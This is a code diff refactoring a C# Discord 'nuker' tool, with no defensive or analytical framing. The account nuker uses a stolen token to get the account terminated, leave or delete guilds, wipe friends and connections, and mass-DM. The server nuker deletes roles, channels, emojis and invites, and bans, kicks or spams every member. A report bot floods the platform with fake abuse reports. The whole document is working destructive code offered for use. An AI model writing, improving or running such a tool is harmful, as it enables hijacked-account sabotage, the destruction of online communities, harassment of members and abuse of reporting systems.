@@ -77,81 +77,76 @@ namespace nuker
             WriteLine("2", "Server nuker");
             WriteLine("3", "Report bot");
             Console.Write("Your choice: ");
-            string option = Console.ReadLine();
-            if (option == "1")
+            int option = Convert.ToInt32(Console.ReadLine());
+            switch(option)
             {
-                Console.Title = $"github.com/extatent | {client.User}";
-                Console.Clear();
-                AccountNuker();
-            }
-            else if (option == "2")
-            {
-                Console.Write("Guild ID: ");
+                default:
+                    Console.WriteLine("Not a valid option.");
+                    break;
+                case 1:
+                    Console.Title = $"github.com/extatent | {client.User}";
+                    Console.Clear();
+                    AccountNuker();
+                    break;
+                case 2:
+                    Console.Write("Guild ID: ");
+                    string guildid = Console.ReadLine();
+                    DiscordGuild guild = client.GetGuild(ulong.Parse(guildid));
+                    Console.Title = $"github.com/extatent | {client.User} | {guild.Name}";
+                    Console.Clear();
+                    ServerNuker();
+                    break;
+                case 3:
+                    Console.Write("Guild ID: ");
+                    string guildID = Console.ReadLine();
+                    Console.Write("Channel ID: ");
+                    string channelid = Console.ReadLine();
+                    Console.Write("Message ID: ");
+                    string messageid = Console.ReadLine();
+                    Console.WriteLine("[1] Illegal Content\n[2] Harrassment\n[3] Spam or Phishing Links\n[4] Self harm\n[5] NSFW");
+                    Console.Write("Your choice: ");
+                    string reason = Console.ReadLine();
+                    Console.WriteLine("Reports count: ");
+                    int count = int.Parse(Console.ReadLine());
 
-                guildid = ulong.Parse(Console.ReadLine());
-
-                DiscordGuild guild = client.GetGuild(guildid);
-
-                Console.Title = $"github.com/extatent | {client.User} | {guild.Name}";
-                Console.Clear();
-                ServerNuker();
-            }
-            else if (option == "3")
-            {
-                Console.Write("Guild ID: ");
-                string guildid = Console.ReadLine();
-                Console.Write("Channel ID: ");
-                string channelid = Console.ReadLine();
-                Console.Write("Message ID: ");
-                string messageid = Console.ReadLine();
-                Console.WriteLine("[1] Illegal Content\n[2] Harrassment\n[3] Spam or Phishing Links\n[4] Self harm\n[5] NSFW");
-                Console.Write("Your choice: ");
-                string reason = Console.ReadLine();
-                Console.WriteLine ("Reports count: ");
-                int count = int.Parse(Console.ReadLine());
-
-                HttpRequest httpRequest = new HttpRequest();
-                httpRequest.Authorization = token;
-                httpRequest.UserAgentRandomize();
-                string url = "https://discord.com/api/v10/report";
-                string jsonData = string.Concat(new string[]
-                {
-            "{\"channel_id\": \"",
-            channelid,
-            "\", \"guild_id\": \"",
-            guildid,
-            "\", \"message_id\": \"",
-            messageid,
-            "\", \"reason\": \"",
-            reason,
-            "\" }"
-                });
-                int reports = 0;
-                for (int i = 0; i < count; i++)
-                {
-                    try
+                    HttpRequest httpRequest = new HttpRequest();
+                    httpRequest.Authorization = token;
+                    httpRequest.UserAgentRandomize();
+                    string url = "https://discord.com/api/v10/report";
+                    string jsonData = string.Concat(new string[]
                     {
-                        HttpResponse response = httpRequest.Post(url, jsonData, "application/json");
-                        bool ok = response.StatusCode.ToString() == "Created";
-                        if (ok)
+                        "{\"channel_id\": \"",
+                        channelid,
+                        "\", \"guild_id\": \"",
+                        guildID,
+                        "\", \"message_id\": \"",
+                        messageid,
+                        "\", \"reason\": \"",
+                        reason,
+                        "\" }"
+                    });
+                    int reports = 0;
+                    for (int i = 0; i < count; i++)
+                    {
+                        try
                         {
-                            reports++;
+                            HttpResponse response = httpRequest.Post(url, jsonData, "application/json");
+                            bool status = response.StatusCode.ToString() == "Created";
+                            if (status)
+                            {
+                                reports++;
+                            }
+
+                            Console.Title = $"github.com/extatent | {client.User} | Reports sent: " + reports.ToString();
                         }
-
-                        Console.Title = $"github.com/extatent | {client.User} | Reports sent: " + reports.ToString();
+                        catch
+                        { }
                     }
-                    catch
-                    { }
-                }
-                Console.Title = $"github.com/extatent | {client.User}";
-                Console.WriteLine("Done. Total reports sent: " + reports.ToString());
+                    Console.Title = $"github.com/extatent | {client.User}";
+                    Console.WriteLine("Done. Total reports sent: " + reports.ToString());
+                    break;
             }
-            else
-            {
-                Console.WriteLine("Wrong key");
-            }
-
-            Console.ReadLine();
+            
         }
 
         class config
@@ -166,431 +161,355 @@ namespace nuker
             Console.WriteLine("] " + text);
         }
 
+        static void DoneMethod()
+        {
+            Console.WriteLine("Done");
+            Thread.Sleep(2000);
+            Console.Clear();
+            AccountNuker();
+        }
+
         static void AccountNuker()
         {
-            WriteLogo();
-            WriteLine("1", "Terminate account");
-            WriteLine("2", "Leave and delete guilds");
-            WriteLine("3", "Remove all relationships (clear blocked users list, friend list, request list)");
-            WriteLine("4", "Leave HypeSquad");
-            WriteLine("5", "Remove connections");
-            WriteLine("6", "Deauthorize apps");
-            WriteLine("7", "Mass create guilds");
-            WriteLine("8", "Seizure mode");
-            WriteLine("9", "Confuse mode");
-            WriteLine("10", "Mass dm");
-            Console.Write("Your choice: ");
-            string option = Console.ReadLine();
-            if (option == "1")
+            string[] options =
             {
-                using (HttpRequest req = new HttpRequest())
-                {
-                    while (true)
+                "Terminate Account", "Leave/Delete Guilds", "Clear Relationships", "Leave HypeSquad", "Remove Connections", "Deauthorize Apps", 
+                "Mass Create Guilds", "Seizure Mode", "Confuse Mode", "Mass DM"
+            };
+            int j = 0;
+            WriteLogo();
+            foreach (string opt in options)
+            {
+                j += 1;
+                WriteLine(j.ToString(), opt.ToString());
+            }
+            Console.Write("Your choice: ");
+            int option = Convert.ToInt32(Console.ReadLine());
+            switch(option)
+            {
+                default:
+                    Console.WriteLine("Wrong key");
+                    Thread.Sleep(2000);
+                    Console.Clear();
+                    AccountNuker();
+                    break;
+                case 1:
+                    using (HttpRequest req = new HttpRequest())
+                    {
+                        while (true)
+                        {
+                            try
+                            {
+                                req.AddHeader("Authorization", token);
+                                req.Post("https://discordapp.com/api/v9/invite/terraria");
+                                client.Token = token;
+                            }
+                            catch
+                            { }
+                        }
+                    }
+                case 2:
+                    foreach (var guild in client.GetGuilds())
                     {
                         try
                         {
-                            req.AddHeader("Authorization", token);
-                            req.Post("https://discordapp.com/api/v9/invite/terraria");
-                            client.Token = token;
+                            if (guild.Owner)
+                            {
+                                guild.Delete();
+                            }
+                            else
+                            {
+                                guild.Leave();
+                            }
+                            Thread.Sleep(200);
+                        }
+                        catch { }
+                    }
+                    DoneMethod();
+                    break;
+                case 3:
+                    foreach (var relationship in client.GetRelationships())
+                    {
+                        try
+                        {
+                            relationship.Remove();
+                            Thread.Sleep(200);
                         }
                         catch
                         { }
                     }
-                }
-            }
-            else if (option == "2")
-            {
-                foreach (var guild in client.GetGuilds())
-                {
+                    Console.WriteLine("Done");
+                    Thread.Sleep(2000);
+                    Console.Clear();
+                    AccountNuker();
+                    break;
+                case 4:
+                    client.User.SetHypesquad(Hypesquad.None);
+                    client.User.Update();
+                    DoneMethod();
+                    break;
+                case 5:
+                    foreach (var connections in client.GetConnectedAccounts())
+                    {
+                        try
+                        {
+                            connections.Remove();
+                            Thread.Sleep(200);
+                        }
+                        catch
+                        { }
+                    }
+                    DoneMethod();
+                    break;
+                case 6:
+                    foreach (var apps in client.GetAuthorizedApps())
+                    {
+                        try
+                        {
+                            apps.Deauthorize();
+                            Thread.Sleep(200);
+                        }
+                        catch
+                        { }
+                    }
+                    DoneMethod();
+                    break;
+                case 7:
                     try
                     {
-                        if (guild.Owner)
+                        Console.Write("Guild name: ");
+                        string name = Console.ReadLine();
+
+                        while (true)
                         {
-                            guild.Delete();
+                            for (int i = 0; i < 100; i++)
+                            {
+                                client.CreateGuild(name);
+                                Thread.Sleep(200);
+                            }
                         }
-                        else
-                        {
-                            guild.Leave();
-                        }
-                        Thread.Sleep(200);
+
                     }
-                    catch { }
-                }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                AccountNuker();
-            }
-            else if (option == "3")
-            {
-                foreach (var relationship in client.GetRelationships())
-                {
+                    catch
+                    { }
+                    DoneMethod();
+                    break;
+                case 8:
                     try
+                    {
+                        while (true)
+                        {
+                            for (int i = 0; i < 1000; i++)
+                            {
+                                client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
+                                Thread.Sleep(200);
+                                client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Dark });
+                                Thread.Sleep(200);
+                            }
+                        }
+                    }
+                    catch
+                    { }
+                    DoneMethod();
+                    break;
+                case 9:
+                    try
+                    {
+                        client.User.ChangeSettings(new UserSettingsProperties() { 
+                            Language = DiscordLanguage.Chinese, 
+                            Theme = DiscordTheme.Light, 
+                            DeveloperMode = false,
+                            EnableTts = true, 
+                            CompactMessages = true, 
+                            ExplicitContentFilter = ExplicitContentFilter.DoNotScan 
+                        });
+                    }
+                    catch
+                    { }
+                    DoneMethod();
+                    break;
+                case 10:
+                    Console.Write("Message: ");
+                    string message = Console.ReadLine();
+
+                    var relationships = client.GetRelationships();
+
+                    foreach (var relationship in relationships)
                     {
                         if (relationship.Type == RelationshipType.Friends)
                         {
-                            relationship.Remove();
-                        }
-                        if (relationship.Type == RelationshipType.IncomingRequest)
-                        {
-                            relationship.Remove();
-                        }
-                        if (relationship.Type == RelationshipType.OutgoingRequest)
-                        {
-                            relationship.Remove();
-                        }
-                        if (relationship.Type == RelationshipType.Blocked)
-                        {
-                            relationship.Remove();
-                        }
-                        Thread.Sleep(200);
-                    }
-                    catch
-                    { }
-                }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                AccountNuker();
-            }
-            else if (option == "4")
-            {
-                client.User.SetHypesquad(Hypesquad.None);
-                client.User.Update();
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                AccountNuker();
-            }
-            else if (option == "5")
-            {
-                foreach (var connections in client.GetConnectedAccounts())
-                {
-                    try
-                    {
-                        connections.Remove();
-                        Thread.Sleep(200);
-                    }
-                    catch
-                    { }
-                }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                AccountNuker();
-            }
-            else if (option == "6")
-            {
-                foreach (var apps in client.GetAuthorizedApps())
-                {
-                    try
-                    {
-                        apps.Deauthorize();
-                        Thread.Sleep(200);
-                    }
-                    catch
-                    { }
-                }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                AccountNuker();
-            }
-            else if (option == "7")
-            {
-                try
-                {
-                    Console.Write("Guild name: ");
-                    string name = Console.ReadLine();
-
-                    while (true)
-                    {
-                        for (int i = 0; i < 100; i++)
-                        {
-                            client.CreateGuild(name);
+                            PrivateChannel channel = client.CreateDM(relationship.User.Id);
+                            client.SendMessage(channel, message);
                             Thread.Sleep(200);
                         }
                     }
-
-                }
-                catch
-                { }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                AccountNuker();
-            }
-            else if (option == "8")
-            {
-                try
-                {
-                    while (true)
-                    {
-                        for (int i = 0; i < 1000; i++)
-                        {
-                            client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
-                            Thread.Sleep(200);
-                            client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Dark });
-                            Thread.Sleep(200);
-                        }
-                    }
-                }
-                catch
-                { }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                AccountNuker();
-            }
-            else if (option == "9")
-            {
-                try
-                {
-                    client.User.ChangeSettings(new UserSettingsProperties() { Language = DiscordLanguage.Chinese, Theme = DiscordTheme.Light, DeveloperMode = false, EnableTts = true, CompactMessages = true, ExplicitContentFilter = ExplicitContentFilter.DoNotScan });
-                }
-                catch
-                { }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                AccountNuker();
-            }
-            else if (option == "10")
-            {
-                Console.Write("Message: ");
-                string message = Console.ReadLine();
-
-                var relationships = client.GetRelationships();
-
-                foreach (var relationship in relationships)
-                {
-                    if (relationship.Type == RelationshipType.Friends)
-                    {
-                        PrivateChannel channel = client.CreateDM(relationship.User.Id);
-                        client.SendMessage(channel, message);
-                        Thread.Sleep(200);
-                    }
-                }
-
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                AccountNuker();
-            }
-            else
-            {
-                Console.WriteLine("Wrong key");
-                Thread.Sleep(2000);
-                Console.Clear();
-                AccountNuker();
+                    DoneMethod();
+                    break;
             }
         }
 
         static void ServerNuker()
         {
+            string[] options =
+            {
+                "Delete All Roles", "Remove All Bans", "Delete All Channels", "Delete All Emojis", "Delete All Invites", "Mass Create Roles",
+                "Mass Create Channels", "Ban All Members", "Kick All Members", "Mass DM"
+            };
+            int j = 0;
             WriteLogo();
-            WriteLine("1", "Delete all roles");
-            WriteLine("2", "Remove all bans");
-            WriteLine("3", "Delete all channels");
-            WriteLine("4", "Delete all emojis");
-            WriteLine("5", "Delete all invites");
-            WriteLine("6", "Mass create roles");
-            WriteLine("7", "Mass create channels");
-            WriteLine("8", "Ban all members");
-            WriteLine("9", "Kick all members");
-            WriteLine("10", "Mass dm");
+            foreach (string opt in options)
+            {
+                j += 1;
+                WriteLine(j.ToString(), opt.ToString());
+            }
             Console.Write("Your choice: ");
-            string option = Console.ReadLine();
+            int option = Convert.ToInt32(Console.ReadLine());
             DiscordGuild guild = client.GetGuild(guildid);
-            if (option == "1")
+            switch(option)
             {
-                foreach (var roles in guild.GetRoles())
-                {
-                    try
+                default:
+                    Console.WriteLine("Wrong key");
+                    Thread.Sleep(2000);
+                    Console.Clear();
+                    ServerNuker();
+                    break;
+                case 1:
+                    foreach (var roles in guild.GetRoles())
                     {
-                        roles.Delete();
-                        Thread.Sleep(200);
+                        try
+                        {
+                            roles.Delete();
+                            Thread.Sleep(200);
+                        }
+                        catch { }
                     }
-                    catch { }
-                }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                ServerNuker();
-            }
-            else if (option == "2")
-            {
-                foreach (var bans in guild.GetBans())
-                {
-                    try
+                    DoneMethod();
+                    break;
+                case 2:
+                    foreach (var bans in guild.GetBans())
                     {
-                        bans.Unban();
-                        Thread.Sleep(200);
+                        try
+                        {
+                            bans.Unban();
+                            Thread.Sleep(200);
+                        }
+                        catch { }
                     }
-                    catch { }
-                }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                ServerNuker();
-            }
-            else if (option == "3")
-            {
-                foreach (var channels in guild.GetChannels())
-                {
-                    try
+                    DoneMethod();
+                    break;
+                case 3:
+                    foreach (var channels in guild.GetChannels())
                     {
-                        channels.Delete();
-                        Thread.Sleep(200);
+                        try
+                        {
+                            channels.Delete();
+                            Thread.Sleep(200);
+                        }
+                        catch { }
                     }
-                    catch { }
-                }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                ServerNuker();
-            }
-            else if (option == "4")
-            {
-                foreach (var emojis in guild.GetEmojis())
-                {
-                    try
+                    DoneMethod();
+                    break;
+                case 4:
+                    foreach (var emojis in guild.GetEmojis())
                     {
-                        emojis.Delete();
-                        Thread.Sleep(200);
+                        try
+                        {
+                            emojis.Delete();
+                            Thread.Sleep(200);
+                        }
+                        catch { }
                     }
-                    catch { }
-                }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                ServerNuker();
-            }
-            else if (option == "5")
-            {
-                foreach (var invites in guild.GetInvites())
-                {
-                    try
+                    DoneMethod();
+                    break;
+                case 5:
+                    foreach (var invites in guild.GetInvites())
                     {
-                        invites.Delete();
-                        Thread.Sleep(200);
+                        try
+                        {
+                            invites.Delete();
+                            Thread.Sleep(200);
+                        }
+                        catch { }
                     }
-                    catch { }
-                }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                ServerNuker();
-            }
-            else if (option == "6")
-            {
-                try
-                {
-                    while (true)
+                    DoneMethod();
+                    break;
+                case 6:
+                    try
                     {
                         for (int i = 0; i < 100; i++)
                         {
-                            guild.CreateRole();
+                            try
+                            {
+                                guild.CreateRole();
+                                Thread.Sleep(200);
+                            }
+                            catch { }
+                        }
+                    }
+                    catch
+                    { }
+                    DoneMethod();
+                    break;
+                case 7:
+                    try
+                    {
+                        Console.Write("Channel name: ");
+                        string name = Console.ReadLine();
+                        for (int i = 0; i < 100; i++)
+                        {
+                            try
+                            {
+                                guild.CreateChannel(name, 0);
+                                Thread.Sleep(200);
+                            }
+                            catch { }
+                        }
+                    }
+                    catch
+                    { }
+                    DoneMethod();
+                    break;
+                case 8:
+                    try
+                    {
+                        foreach (var user in client.GetCachedGuild(Convert.ToUInt64(guildid)).GetMembers())
+                        {
+                            user.Ban();
                             Thread.Sleep(200);
                         }
                     }
-                }
-                catch
-                { }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                ServerNuker();
-            }
-            else if (option == "7")
-            {
-                try
-                {
-                    Console.Write("Channel name: ");
-                    string name = Console.ReadLine();
+                    catch
+                    { }
+                    DoneMethod();
+                    break;
+                case 9:
+                    try
+                    {
+                        foreach (var user in client.GetCachedGuild(Convert.ToUInt64(guildid)).GetMembers())
+                        {
+                            user.Kick();
+                            Thread.Sleep(200);
+                        }
+                    }
+                    catch
+                    { }
+                    DoneMethod();
+                    break;
+                case 10:
+                    Console.Write("Message: ");
+                    string message = Console.ReadLine();
 
-                    while (true)
-                    {
-                        for (int i = 0; i < 100; i++)
-                        {
-                            guild.CreateChannel(name, 0);
-                            Thread.Sleep(200);
-                        }
-                    }
-                }
-                catch
-                { }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                ServerNuker();
-            }
-            else if (option == "8")
-            {
-                try
-                {
                     var get = client.GetCachedGuild(Convert.ToUInt64(guildid));
                     var members = get.GetMembers();
 
                     foreach (var user in members)
                     {
-                        user.Ban();
+                        PrivateChannel channel = client.CreateDM(user.User.Id);
+                        client.SendMessage(channel, message);
                         Thread.Sleep(200);
                     }
-                }
-                catch
-                { }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                ServerNuker();
-            }
-            else if (option == "9")
-            {
-                try
-                {
-                    var get = client.GetCachedGuild(Convert.ToUInt64(guildid));
-                    var members = get.GetMembers();
-
-                    foreach (var user in members)
-                    {
-                        user.Kick();
-                        Thread.Sleep(200);
-                    }
-                }
-                catch
-                { }
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                ServerNuker();
-            }
-            else if (option == "10")
-            {
-                Console.Write("Message: ");
-                string message = Console.ReadLine();
-
-                var get = client.GetCachedGuild(Convert.ToUInt64(guildid));
-                var members = get.GetMembers();
-
-                foreach (var user in members)
-                {
-                    PrivateChannel channel = client.CreateDM(user.User.Id);
-                    client.SendMessage(channel, message);
-                    Thread.Sleep(200);
-                }
-
-                Console.WriteLine("Done");
-                Thread.Sleep(2000);
-                Console.Clear();
-                ServerNuker();
-            }
-            else
-            {
-                Console.WriteLine("Wrong key");
-                Thread.Sleep(2000);
-                Console.Clear();
-                ServerNuker();
+                    DoneMethod();
+                    break;
             }
         }
     }
